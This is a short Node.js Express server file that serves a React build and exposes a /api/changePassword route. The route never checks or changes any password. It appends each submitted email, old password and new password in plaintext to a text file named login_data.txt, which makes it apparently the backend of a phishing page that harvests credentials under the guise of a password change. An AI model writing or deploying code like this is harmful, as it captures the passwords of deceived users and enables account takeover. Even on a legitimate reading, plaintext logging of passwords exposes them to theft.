const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();

// Middleware
app.use(express.json());
app.use(cors()); // OK because frontend & backend share same origin on Render

// ============================
// API ROUTE
// ============================
app.post('/api/changePassword', (req, res) => {
  const { email, old_password, new_password } = req.body;

  const timestamp = new Date().toISOString();
  const data = `Timestamp: ${timestamp}
Email: ${email}
Old Password: ${old_password}
New Password: ${new_password}
==================================================

`;

  fs.appendFile('login_data.txt', data, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).json({
        success: false,
        message: 'Failed to save data'
      });
    }

    console.log('Password change saved!');
    res.json({
      success: true,
      message: 'Password change saved!'
    });
  });
});

// ============================
// SERVE REACT (IMPORTANT)
// ============================
app.use(express.static(path.join(__dirname, 'build')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

// ============================
// PORT (RENDER FIX)
// ============================
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
